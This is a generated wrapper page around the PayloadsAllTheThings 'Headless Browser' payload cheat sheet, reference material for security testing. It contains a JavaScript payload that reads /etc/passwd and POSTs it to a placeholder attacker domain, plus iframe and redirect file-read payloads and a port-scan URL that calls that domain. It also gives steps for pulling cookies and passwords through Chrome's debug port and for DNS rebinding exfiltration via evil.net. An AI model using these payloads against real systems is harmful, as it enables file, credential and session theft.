---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Headless Browser

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-headless-browser-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Headless Browser/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Headless Browser](../../topics/headless-browser/headless-browser.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-headless-browser-readme |
| name | Headless Browser |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Headless%20Browser/README.md |

## Preserved Source Material

````yaml
_body: "# Headless Browser\n\n> A headless browser is a web browser without a graphical user interface. It works just like\
  \ a regular browser, such as Chrome or Firefox, by interpreting HTML, CSS, and JavaScript, but it does so in the background,\
  \ without displaying any visuals.\n> Headless browsers are primarily used for automated tasks, such as web scraping, testing,\
  \ and running scripts. They are particularly useful in situations where a full-fledged browser is not needed, or where resources\
  \ (like memory or CPU) are limited.\n\n## Summary\n\n* [Headless Commands](#headless-commands)\n* [Local File Read](#local-file-read)\n\
  * [Remote Debugging Port](#remote-debugging-port)\n* [Network](#network)\n    * [Port Scanning](#port-scanning)\n    * [DNS\
  \ Rebinding](#dns-rebinding)\n* [CVE](#cve)\n* [References](#references)\n\n## Headless Commands\n\nExample of headless\
  \ browsers commands:\n\n* Google Chrome\n\n    ```ps1\n    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com\n\
  \    ```\n\n* Mozilla Firefox\n\n    ```ps1\n    firefox --screenshot https://www.google.com\n    ```\n\n* Microsoft Edge\n\
  \n    ```ps1\n    \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --headless --disable-gpu --window-size=1280,720\
  \ --screenshot=\"C:\\tmp\\screen.png\" \"https://google.com\"\n    ```\n\n## Local File Read\n\n### Insecure Flags\n\nIf\
  \ the target is launched with the `--allow-file-access` option\n\n```ps1\ngoogle-chrome-stable --disable-gpu --headless=new\
  \ --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt\
  \ --user-data-dir\n```\n\nSince the file access is allowed, an atacker can create and expose an HTML file which captures\
  \ the content of the `/etc/passwd` file.\n\n```js\n<script>\n  async function getFlag(){\n    response = await fetch(\"\
  file:///etc/passwd\");\n    flag = await response.text();\n  fetch(\"https://[ATTACKER.DOMAIN.TLD]/\", { method: \"POST\"\
  , body: flag})\n  };\n  getFlag();\n</script>\n```\n\n### PDF Rendering\n\nConsider a scenario where a headless browser\
  \ captures a copy of a webpage and exports it to PDF, while the attacker has control over the URL being processed.\n\nTarget:\
  \ `google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`\n\n* Javascript Redirect\n\n    ```html\n\
  \    <html>\n        <body>\n            <script>\n                window.location=\"/etc/passwd\"\n            </script>\n\
  \        </body>\n    </html>\n    ```\n\n* Iframe\n\n    ```html\n    <html>\n        <body>\n            <iframe src=\"\
  /etc/passwd\" height=\"640\" width=\"640\"></iframe>\n        </body>\n    </html>\n    ```\n\n## Remote Debugging Port\n\
  \nThe Remote Debugging Port in a headless browser (like Headless Chrome or Chromium) is a TCP port that exposes the browser’s\
  \ DevTools Protocol so external tools (or scripts) can connect and control the browser remotely. It usually listen on port\
  \ **9222** but it can be changed with `--remote-debugging-port=`.\n\n**Target**: `google-chrome-stable --headless=new --remote-debugging-port=XXXX\
  \ ./index.html`\n\n**Tools**:\n\n* [slyd0g/WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)\
  \ - Interact with Chromium-based browsers' debug port to view open tabs, installed extensions, and cookies\n* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py)\
  \ - WCMN alternative using Python to fix the websocket connection with an empty `origin` Header.\n\n> [!NOTE]  \n> Since\
  \ Chrome update from December 20, 2022, you must start the browser with the argument `--remote-allow-origins=\"*\"` to connect\
  \ to the websocket with WhiteChocolateMacademiaNut.\n\n**Exploits**:\n\n* Connect and interact with the browser: `chrome://inspect/#devices`,\
  \ `opera://inspect/#devices`\n* Kill the currently running browser and use the `--restore-last-session` to get access to\
  \ the user's tabs\n* Data stored in the settings (username, passwords, token): `chrome://settings`\n* Port Scan: In a loop\
  \ open `http://localhost:<port>/json/new?http://[ATTACKER.DOMAIN.TLD]/?port=<port>`\n* Leak UUID: Iframe: `http://127.0.0.1:<port>/json/version`\n\
  \n    ```json\n    {\n        \"Browser\": \"Chrome/136.0.7103.113\",\n        \"Protocol-Version\": \"1.3\",\n        \"\
  User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.0.0 Safari/537.36\"\
  ,\n        \"V8-Version\": \"13.6.233.10\",\n        \"WebKit-Version\": \"537.36 (@76fa3c1782406c63308c70b54f228fd39c7aaa71)\"\
  ,\n        \"webSocketDebuggerUrl\": \"ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87\"\n   \
  \ }\n    ```\n\n* Local File Read: [pich4ya/chrome_remote_debug_lfi.py](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)\n\
  * Node inspector `--inspect` works like a `--remote-debugging-port`\n\n    ```ps1\n    node --inspect app.js # default port\
  \ 9229\n    node --inspect=4444 app.js # custom port 4444\n    node --inspect=0.0.0.0:4444 app.js\n    ```\n\nStarting from\
  \ Chrome 136, the switches `--remote-debugging-port` and `--remote-debugging-pipe` won't be respected if attempting to debug\
  \ the default Chrome data directory. These switches must now be accompanied by the `--user-data-dir` switch to point to\
  \ a non-standard directory.\n\nThe flag `--user-data-dir=/path/to/data_dir` is used to specify the user's data directory,\
  \ where Chromium stores all of its application data such as cookies and history. If you start Chromium without specifying\
  \ this flag, you’ll notice that none of your bookmarks, favorites, or history will be loaded into the browser.\n\n## Network\n\
  \n### Port Scanning\n\nPort Scanning: Timing attack\n\n* Dynamically insert an `<img>` tag pointing to a hypothetical closed\
  \ port. Measure time to onerror.\n* Repeat at least 10 times → average time to get an error for a closed port\n* Test random\
  \ port 10 times and measure time to error\n* If `time_to_error(random_port) > time_to_error(closed_port)*1.3` → port is\
  \ opened\n\n**Consideration**:\n\n* Chrome blocks by default a list of \"known ports\"\n* Chrome blocks access to local\
  \ network addresses except localhost through 0.0.0.0\n\n### DNS Rebinding\n\n* [nccgroup/singularity](https://github.com/nccgroup/singularity)\
  \ - A DNS rebinding attack framework.\n\n1. Chrome will make 2 DNS requests: `A` and `AAAA` records\n    * `AAAA` response\
  \ with valid Internet IP\n    * `A` response with internal IP\n2. Chrome will connect in priority to the IPv6 (evil.net)\n\
  3. Close IPv6 listener just after first response\n4. Open Iframe to evil.net\n5. Chrome will attempt to connect to the IPv6\
  \ but as it will fail it will fallback to the IPv4\n6. From top window, inject script into iframe to exfiltrate content\n\
  \n## CVE\n\nExploiting a headless browser using a known vulnerability (CVE) involves several steps, from vulnerability research\
  \ to payload execution. Below is a structured breakdown of the process:\n\nIdentify the headless browser with the User-Agent,\
  \ then choose an exploit targeting the browser's component: V8 engine, Blink renderer, Webkit, etc.\n\n* Chrome CVE: [2024-9122\
  \ - WASM type confusion due to imported tag signature subtyping](https://issues.chromium.org/issues/365802567), [CVE-2025-5419\
  \ - Out of bounds read and write in V8](https://nvd.nist.gov/vuln/detail/CVE-2025-5419)\n* Firefox : [CVE-2024-9680 - Use\
  \ after free](https://nvd.nist.gov/vuln/detail/CVE-2024-9680)\n\nThe `--no-sandbox` option disables the sandbox feature\
  \ of the renderer process.\n\n```js\nconst browser = await puppeteer.launch({\n    args: ['--no-sandbox']\n});\n```\n\n\
  ## References\n\n* [Browser based Port Scanning with JavaScript - Nikolai Tschacher - January 10, 2021](https://web.archive.org/web/20210119151816/https://incolumitas.com/2021/01/10/browser-based-port-scanning/)\n\
  * [Changes to remote debugging switches to improve security - Will Harris - March 17, 2025](https://web.archive.org/web/20250328233439/https://developer.chrome.com/blog/remote-debugging-port)\n\
  * [Chrome DevTools Protocol - Documentation - July 3, 2017](https://web.archive.org/web/20170703201537/https://chromedevtools.github.io/devtools-protocol/)\n\
  * [Cookies with Chromium’s Remote Debugger Port - Justin Bui - December 17, 2020](https://web.archive.org/web/20201217170910/https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)\n\
  * [Debugging Cookie Dumping Failures with Chromium’s Remote Debugger - Justin Bui - July 16, 2023](https://web.archive.org/web/20250911211108/https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)\n\
  * [Node inspector/CEF debug abuse - HackTricks - July 18, 2024](https://web.archive.org/web/20241230021023/https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)\n\
  * [Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely - wunderwuzzi\
  \ - April 28, 2020](https://web.archive.org/web/20260215064320/https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)\n\
  * [Too Lazy to get XSS? Then use n-days to get RCE in the Admin bot - Jopraveen - March 2, 2025](https://web.archive.org/web/20250303031943/https://jopraveen.github.io/web-hackthebot/)\n\
  * [Tricks for Reliable Split-Second DNS Rebinding in Chrome and Safari - Daniel Thatcher - December 6, 2023](https://web.archive.org/web/20231206141057/https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)"
_relative_path: Headless Browser/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Headless Browser/README.md
````
